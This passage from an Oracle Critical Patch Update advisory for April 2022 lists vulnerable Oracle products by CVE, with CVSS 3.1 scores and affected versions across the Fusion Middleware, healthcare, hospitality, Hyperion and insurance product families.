| CVE-2021-30129 | Oracle FLEXCUBE Universal Banking | Infrastructure (Apache MINA SSHD) | HTTP | No | 6.5 | Network | Low | Low | None | Un- changed | None | None | High | 14.0-14.3, 14.5 |  |
| CVE-2022-21475 | Oracle Banking Payments | Infrastructure | HTTP | No | 5.9 | Network | High | Low | Required | Un- changed | Low | High | Low | 14.5 |  |
| CVE-2022-21474 | Oracle Banking Trade Finance | Infrastructure | HTTP | No | 5.9 | Network | High | Low | Required | Un- changed | Low | High | Low | 14.5 |  |
| CVE-2022-21473 | Oracle Banking Treasury Management | Infrastructure | HTTP | No | 5.9 | Network | High | Low | Required | Un- changed | Low | High | Low | 14.5 |  |
| CVE-2021-38153 | Oracle Financial Services Analytical Applications Infrastructure | Others (Apache Kafka) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | High | None | None | 8.0.6.0-8.0.9.0, 8.1.0.0-8.1.2.0 |  |
| CVE-2021-38153 | Oracle Financial Services Behavior Detection Platform | Third Party (Apache Kafka) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | High | None | None | 8.0.6.0-8.0.8.0, 8.1.1.0, 8.1.1.1, 8.1.2.0 |  |
| CVE-2021-38153 | Oracle Financial Services Enterprise Case Management | Installers (Apache Kafka) | HTTP | Yes | 5.9 | Network | High | None | None | Un- changed | High | None | None | 8.0.7.1, 8.0.7.2, 8.0.8.0, 8.0.8.1, 8.1.1.0, 8.1.1.1 |  |
| CVE-2022-21472 | Oracle FLEXCUBE Universal Banking | Infrastructure | HTTP | No | 5.9 | Network | High | Low | Required | Un- changed | Low | High | Low | 12.4, 14.0-14.3, 14.5 |  |
| CVE-2021-36374 | Oracle Banking Trade Finance | Infrastructure (Apache Ant) | None | No | 5.5 | Local | Low | None | Required | Un- changed | None | None | High | 14.5 |  |
| CVE-2021-31812 | Oracle Banking Trade Finance | Infrastructure (Apache PDFBox) | None | No | 5.5 | Local | Low | None | Required | Un- changed | None | None | High | 14.5 |  |
| CVE-2021-36374 | Oracle Banking Treasury Management | Infrastructure (Apache Ant) | None | No | 5.5 | Local | Low | None | Required | Un- changed | None | None | High | 14.5 |  |
| CVE-2021-31812 | Oracle Banking Treasury Management | Infrastructure (Apache PDFBox) | None | No | 5.5 | Local | Low | None | Required | Un- changed | None | None | High | 14.5 |  |
| CVE-2021-31812 | Oracle FLEXCUBE Universal Banking | Infrastructure (Apache PDFBox) | None | No | 5.5 | Local | Low | None | Required | Un- changed | None | None | High | 14.0-14.3, 14.5 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2021-31812 also addresses CVE-2021-27807, CVE-2021-27906, and CVE-2021-31811.
* The patch for CVE-2021-36090 also addresses CVE-2021-35515, CVE-2021-35516, and CVE-2021-35517.
* The patch for CVE-2021-36374 also addresses CVE-2021-36373.
* The patch for CVE-2021-38153 also addresses CVE-2021-26291.
* The patch for CVE-2021-44832 also addresses CVE-2021-45105.
* The patch for CVE-2022-23305 also addresses CVE-2021-4104, CVE-2022-23302, and CVE-2022-23307.

#### Oracle Fusion Middleware Risk Matrix

This Critical Patch Update contains 54 new security patches plus additional third party patches noted below for Oracle Fusion Middleware.  41 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#FMW)

Oracle Fusion Middleware products include Oracle Database components that are affected by the vulnerabilities listed in the Oracle Database section. The exposure of Oracle Fusion Middleware products is dependent on the Oracle Database version being used. Oracle Database security updates are not listed in the Oracle Fusion Middleware risk matrix. However, since vulnerabilities affecting Oracle Database versions may affect Oracle Fusion Middleware products, Oracle recommends that customers apply the Critical Patch Update April 2022 to the Oracle Database components of Oracle Fusion Middleware products. For information on what patches need to be applied to your environments, refer to Critical Patch Update April 2022 Patch Availability Document for Oracle Products, [My Oracle Support Note 2853458.2](https://support.oracle.com/rs?type=doc&id=2853458.2).

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2022-21445 | Oracle Application Development Framework (ADF) | ADF Faces | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 12.2.1.3.0, 12.2.1.4.0 | See Note 1 |
| CVE-2022-23305 | Oracle Business Intelligence Enterprise Edition | Analytics Server (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 5.9.0.0.0 |  |
| CVE-2022-23305 | Oracle Business Intelligence Enterprise Edition | BI Platform Security (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 5.9.0.0.0, 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2022-23305 | Oracle Business Intelligence Enterprise Edition | Storage Service Integration (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 12.2.1.4.0 |  |
| CVE-2022-23305 | Oracle Business Process Management Suite | Runtime Engine (JBoss Enterprise Application Platform) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2022-21420 | Oracle Coherence | Core | T3 | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2021-39275 | Oracle HTTP Server | Web Listener (Apache HTTP Server) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2022-23305 | Oracle Identity Management Suite | Installer (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2022-23305 | Oracle Identity Manager Connector | General and Misc (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | - | See Note 1 |
| CVE-2022-23305 | Oracle JDeveloper | Oracle JDeveloper (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 12.2.1.3.0 |  |
| CVE-2022-23305 | Oracle Middleware Common Libraries and Tools | Third Party Patch (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 12.2.1.4.0 |  |
| CVE-2022-23305 | Oracle Tuxedo | Third Party Patch (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 12.2.2.0.0 |  |
| CVE-2022-23305 | Oracle WebLogic Server | Centralized Third Party Jars (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2022-21404 | Helidon | Reactive WebServer | HTTP | Yes | 8.1 | Network | High | None | None | Un- changed | High | High | High | 1.4.10, 2.0.0-RC1 |  |
| CVE-2021-22901 | Oracle HTTP Server | SSL Module (cURL) | HTTPS | Yes | 8.1 | Network | High | None | None | Un- changed | High | High | High | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2022-21497 | Oracle Web Services Manager | Web Services Security | HTTP | Yes | 8.1 | Network | Low | None | Required | Un- changed | High | High | None | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2022-21421 | Oracle Business Intelligence Enterprise Edition | Analytics Web General | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 5.5.0.0.0, 5.9.0.0.0, 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2021-37714 | Oracle Business Process Management Suite | Installer (jsoup) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2019-0227 | Oracle Internet Directory | Oracle Directory Services Mngr (Apache Axis) | HTTP | Yes | 7.5 | Adjacent Network | High | None | None | Un- changed | High | High | High | 12.2.1.3.0, 12.2.1.4.0 | See Note 2 |
| CVE-2021-40690 | Oracle Outside In Technology | Installation (Apache Santuario XML Security For Java) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | High | None | None | 8.5.5, 8.5.6 | See Note 3 |
| CVE-2021-36090 | Oracle WebCenter Portal | Security Framework (Apache Commons Compress) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2021-37137 | Oracle WebCenter Portal | Security Framework (Netty) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2020-25649 | Oracle WebCenter Portal | Security Framework (jackson-databind) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | High | None | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2021-37714 | Oracle WebCenter Portal | Security Framework (jsoup) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2020-7226 | Oracle WebCenter Sites | WebCenter Sites (Cryptacular) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2022-21441 | Oracle WebLogic Server | Core | T3/IIOP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2021-44832 | Oracle Data Integrator | Runtime Java agent for ODI (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2021-44832 | Oracle Identity Management Suite | Installer (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2021-44832 | Oracle Identity Manager Connector | General and Misc (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 9.1.0 |  |
| CVE-2021-44832 | Oracle JDeveloper | Oracle JDeveloper (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 12.2.1.4.0 |  |
| CVE-2021-44832 | Oracle Managed File Transfer | MFT Runtime Server (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2021-44832 | Oracle WebCenter Portal | Security Framework (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2021-44832 | Oracle WebCenter Sites | Advanced UI (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2021-43797 | Helidon | Reactive WebServer (Netty) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | None | High | None | 1.4.10,2.4.0 |  |
| CVE-2021-30129 | Middleware Common Libraries and Tools | FMW Remote Diagnostic Agent (Apache MINA SSHD and Apache MINA) | HTTP | No | 6.5 | Network | Low | Low | None | Un- changed | None | None | High | 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2021-43797 | Oracle Coherence | Configuration and Parsing (Netty) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | None | High | None | 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2020-24977 | Oracle HTTP Server | SSL Module (libxml2) | HTTPS | Yes | 6.5 | Network | Low | None | None | Un- changed | Low | None | Low | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2021-44224 | Oracle HTTP Server | SSL Module (Apache HTTP Server) | HTTPS | Yes | 6.5 | Network | Low | None | None | Un- changed | None | Low | Low | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2022-23437 | Oracle WebLogic Server | Third Party Tools (Apache Xerces-J) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | None | None | High | 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2022-21492 | Oracle Business Intelligence Enterprise Edition | Analytics Server | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 5.9.0.0.0 |  |
| CVE-2022-21419 | Oracle Business Intelligence Enterprise Edition | Visual Analyzer | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 5.5.0.0.0, 5.9.0.0.0 |  |
| CVE-2022-21448 | Oracle Business Intelligence Enterprise Edition | Visual Analyzer | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 5.9.0.0.0 |  |
| CVE-2022-21453 | Oracle WebLogic Server | Console | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2021-41184 | Oracle WebLogic Server | Console, Samples (jQueryUI) | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0 |  |
| CVE-2020-17521 | Oracle Business Process Management Suite | BPM Studio (Apache Groovy) | None | No | 5.5 | Local | Low | Low | None | Un- changed | High | None | None | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2021-31812 | Oracle WebCenter Portal | Security Framework (Apache PDFbox) | None | No | 5.5 | Local | Low | None | Required | Un- changed | None | None | High | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2021-28657 | Oracle WebCenter Portal | Security Framework (Apache Tika) | None | No | 5.5 | Local | Low | None | Required | Un- changed | None | None | High | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2021-41165 | Oracle WebCenter Portal | Security Framework (CKEditor) | HTTP | No | 5.4 | Network | Low | Low | Required | Changed | Low | Low | None | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2018-11212 | Oracle Internet Directory | Oracle Directory Services Manager (libjpeg) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | None | None | Low | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2021-33037 | Oracle Managed File Transfer | MFT Runtime Server (Apache Tomcat) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | None | Low | None | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2021-28170 | Oracle WebLogic Server | Centralized Third Party Jars (JBoss Enterprise Application Platform) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | None | Low | None | 14.1.1.0.0 |  |
| CVE-2021-29425 | Helidon | CDI support (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 1.4.7, 2.2.0 |  |
| CVE-2021-29425 | Oracle WebCenter Portal | Security Framework (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 12.2.1.3.0, 12.2.1.4.0 |  |
| CVE-2020-8908 | Oracle WebLogic Server | Third Party Tools (Guava) | None | No | 3.3 | Local | Low | Low | None | Un- changed | Low | None | None | 14.1.1.0.0 |  |

#### Notes:

1. Oracle Application Development Framework (ADF) is downloaded via Oracle JDeveloper Product. Please refer to Fusion Middleware Patch Advisor for more details.
2. The supported versions of Oracle Identity Manager Connector are not impacted by CVE-2022-23305, CVE-2022-23302, CVE-2022-23307, and CVE-2021-4104.
3. The patch for CVE-2019-0227 also addresses CVE-2018-2601 for Oracle Internet Directory 12.2.1.4.0.
4. Outside In Technology is a suite of software development kits (SDKs). The protocol and CVSS Base Score depend on the software that uses Outside In Technology. The CVSS score assumes that the software passes data received over a network directly to Outside In Technology, but if data is not received over a network the CVSS score may be lower.

#### Additional CVEs addressed are:

* The patch for CVE-2019-0227 also addresses CVE-2018-8032.
* The patch for CVE-2020-24977 also addresses CVE-2021-22901, CVE-2021-39275, and CVE-2021-44224.
* The patch for CVE-2020-25649 also addresses CVE-2020-35490, CVE-2020-35491, CVE-2020-35728, CVE-2020-36179, CVE-2020-36180, CVE-2020-36181, CVE-2020-36182, CVE-2020-36183, CVE-2020-36184, CVE-2020-36185, CVE-2020-36186, CVE-2020-36187, CVE-2020-36188, and CVE-2020-36189.
* The patch for CVE-2021-28170 also addresses CVE-2020-10693.
* The patch for CVE-2021-30129 also addresses CVE-2021-41973.
* The patch for CVE-2021-31812 also addresses CVE-2021-31811.
* The patch for CVE-2021-36090 also addresses CVE-2021-35515, CVE-2021-35516, and CVE-2021-35517.
* The patch for CVE-2021-37137 also addresses CVE-2021-37136.
* The patch for CVE-2021-41165 also addresses CVE-2021-41164.
* The patch for CVE-2021-41184 also addresses CVE-2021-41182, and CVE-2021-41183.
* The patch for CVE-2021-43797 also addresses CVE-2021-21409, CVE-2021-37136, and CVE-2021-37137.
* The patch for CVE-2022-23305 also addresses CVE-2021-4104, CVE-2022-23302, and CVE-2022-23307.

#### Additional patches are included in this Critical Patch Update for the following non-exploitable CVEs in this Oracle product family:

* Oracle WebCenter Sites
  + WebCenter Sites (Bouncy Castle Java Library): CVE-2020-28052.

#### Oracle Health Sciences Applications Risk Matrix

This Critical Patch Update contains 3 new security patches for Oracle Health Sciences Applications.  1 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#HCAR)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-3711 | Oracle Health Sciences InForm Publisher | Connector (OpenSSL) | TLS | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 6.2.1.0, 6.3.1.1 |  |
| CVE-2021-44832 | Oracle Health Sciences Empirica Signal | Logging (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 9.1.0.6, 9.2.0.0 |  |
| CVE-2021-44832 | Oracle Health Sciences InForm | Cognos logging (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 6.2.1.1, 6.3.2.1, 7.0.0.0 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2021-3711 also addresses CVE-2021-3712, and CVE-2021-4160.
* The patch for CVE-2021-44832 also addresses CVE-2021-45105.

#### Oracle HealthCare Applications Risk Matrix

This Critical Patch Update contains 10 new security patches for Oracle HealthCare Applications.  5 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#HC)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2022-23305 | Oracle Healthcare Data Repository | FHIR (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | 8.1.0 |  |
| CVE-2021-36090 | Oracle Healthcare Data Repository | FHIR Commandline (Apache Commons Compress) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 8.1.0 |  |
| CVE-2021-44832 | Oracle Health Sciences Information Manager | Record Locator (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 3.0.1-3.0.4 |  |
| CVE-2021-44832 | Oracle Healthcare Data Repository | FHIR (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 8.1.1 |  |
| CVE-2021-44832 | Oracle Healthcare Foundation | RPD Generation (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 7.3.0.1-7.3.0.4 |  |
| CVE-2021-44832 | Oracle Healthcare Master Person Index | IHE (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 5.0.1 |  |
| CVE-2021-44832 | Oracle Healthcare Translational Research | Datastudio (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 4.1.1 |  |
| CVE-2021-33037 | Oracle Healthcare Translational Research | Datastudio (Apache Tomcat) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | None | Low | None | 4.1.0 |  |
| CVE-2021-29425 | Oracle Health Sciences Information Manager | Health Policy Engine (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 3.0.1-3.0.4 |  |
| CVE-2021-29425 | Oracle Healthcare Data Repository | FHIR Comandline (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 8.1.0 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2021-36090 also addresses CVE-2021-35515, CVE-2021-35516, and CVE-2021-35517.
* The patch for CVE-2022-23305 also addresses CVE-2021-4104, CVE-2022-23302, and CVE-2022-23307.

#### Oracle Hospitality Applications Risk Matrix

This Critical Patch Update contains 6 new security patches for Oracle Hospitality Applications.  2 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#HOSP)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2020-13936 | Oracle Hospitality Token Proxy Service | TPS Service (Apache Velocity Engine) | HTTP | No | 8.8 | Network | Low | Low | None | Un- changed | High | High | High | 19.2 |  |
| CVE-2021-37714 | Oracle Hospitality Token Proxy Service | TPS Service (jsoup) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 19.2 |  |
| CVE-2021-44832 | Oracle Hospitality Suite8 | Leisure (Apache Log4j) | TCP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 8.13.0, 8.14.0 |  |
| CVE-2021-44832 | Oracle Hospitality Token Proxy Service | TPS Service (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 19.2 |  |
| CVE-2021-44832 | Oracle Payment Interface | OPI Core (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 19.1, 20.3 |  |
| CVE-2021-41184 | Oracle Hospitality Suite8 | WebConnect (jQueryUI) | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 8.10.2, 8.11.0-8.14.0 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2021-41184 also addresses CVE-2021-41182, and CVE-2021-41183.
* The patch for CVE-2021-44832 also addresses CVE-2021-45105.

#### Oracle Hyperion Risk Matrix

This Critical Patch Update contains 12 new security patches for Oracle Hyperion.  4 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#HYP)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2022-23305 | Oracle Hyperion Data Relationship Management | Installation/Configuration (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | Prior to 11.2.8.0 |  |
| CVE-2022-23305 | Oracle Hyperion Infrastructure Technology | Installation and Configuration (Apache Log4j) | HTTP | Yes | 9.8 | Network | Low | None | None | Un- changed | High | High | High | Prior to 11.2.8.0 |  |
| CVE-2021-44832 | Oracle Hyperion BI+ | Architect (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | Prior to 11.2.8.0 |  |
| CVE-2021-44832 | Oracle Hyperion Data Relationship Management | Installation/Configuration (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | Prior to 11.2.8.0 |  |
| CVE-2021-44832 | Oracle Hyperion Financial Management | Security (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | Prior to 11.2.8.0 |  |
| CVE-2021-44832 | Oracle Hyperion Infrastructure Technology | Installation and Configuration (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | Prior to 11.2.8.0 |  |
| CVE-2021-44832 | Oracle Hyperion Planning | Security (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | Prior to 11.2.8.0 |  |
| CVE-2021-44832 | Oracle Hyperion Profitability and Cost Management | Install (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | Prior to 11.2.8.0 |  |
| CVE-2021-44832 | Oracle Hyperion Tax Provision | Tax Provision (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | Prior to 11.2.8.0 |  |
| CVE-2020-6950 | Oracle Hyperion Calculation Manager | General (Eclipse Mojarra) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | High | None | None | Prior to 11.2.8.0 |  |
| CVE-2021-31812 | Oracle Hyperion Infrastructure Technology | Installation and Configuration (Apache PDFbox) | None | No | 5.5 | Local | Low | None | Required | Un- changed | None | None | High | Prior to 11.2.8.0 |  |
| CVE-2020-7760 | Oracle Hyperion Data Relationship Management | Web Client - Unicode (CodeMirror) | HTTP | Yes | 5.3 | Network | Low | None | None | Un- changed | None | None | Low | Prior to 11.2.9.0 |  |

#### Additional CVEs addressed are:

* The patch for CVE-2021-31812 also addresses CVE-2021-31811.
* The patch for CVE-2022-23305 also addresses CVE-2021-4104, CVE-2022-23302, and CVE-2022-23307.

#### Oracle iLearning Risk Matrix

This Critical Patch Update contains 1 new security patch for Oracle iLearning.  This vulnerability is remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#ILRN)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2022-23437 | Oracle iLearning | Installation (Apache Xerces-J) | HTTP | Yes | 6.5 | Network | Low | None | Required | Un- changed | None | None | High | 6.2, 6.3 |  |

#### Oracle Insurance Applications Risk Matrix

This Critical Patch Update contains 7 new security patches for Oracle Insurance Applications.  5 of these vulnerabilities may be remotely exploitable without authentication, i.e., may be exploited over a network without requiring user credentials.  The English text form of this Risk Matrix can be found [here.](/security-alerts/cpuapr2022verbose.html#INSU)

| CVE# | Product | Component | Protocol | Remote Exploit without Auth.? | CVSS VERSION 3.1 RISK (see [Risk Matrix Definitions](/security-alerts/advisorymatrixglossary.html)) | | | | | | | | | Supported Versions Affected | Notes |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Base Score | Attack Vector | Attack Complex | Privs Req'd | User Interact | Scope | Confid- entiality | Inte- grity | Avail- ability |
| CVE-2021-2351 | Oracle Documaker | Development Tools (JDBC, OCCI) | Oracle Net | Yes | 8.3 | Network | High | None | Required | Changed | High | High | High | 12.6.0, 12.6.2-12.6.4, 12.7.0 |  |
| CVE-2021-36090 | Oracle Insurance Policy Administration | Architecture (Apache Commons Compress) | HTTP | Yes | 7.5 | Network | Low | None | None | Un- changed | None | None | High | 11.0.2, 11.1.0, 11.2.8, 11.3.0, 11.3.1 |  |
| CVE-2021-44832 | Oracle Insurance Data Gateway | Security (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 1.0.1 |  |
| CVE-2021-44832 | Oracle Insurance Insbridge Rating and Underwriting | Framework Administrator IBFA (Apache Log4j) | HTTP | No | 6.6 | Network | High | High | None | Un- changed | High | High | High | 5.2.0, 5.4.0-5.6.0, 5.6.1 |  |
| CVE-2021-35043 | Oracle Insurance Policy Administration | Architecture (AntiSamy) | HTTP | Yes | 6.1 | Network | Low | None | Required | Changed | Low | Low | None | 11.0.2, 11.1.0, 11.2.8, 11.3.0, 11.3.1 |  |
| CVE-2021-29425 | Oracle Insurance Policy Administration | Architecture (Apache Commons IO) | HTTP | Yes | 4.8 | Network | High | None | None | Un- changed | Low | Low | None | 11.0.2, 11.1.0, 11.2.8, 11.3.0, 11.3.1 |  |
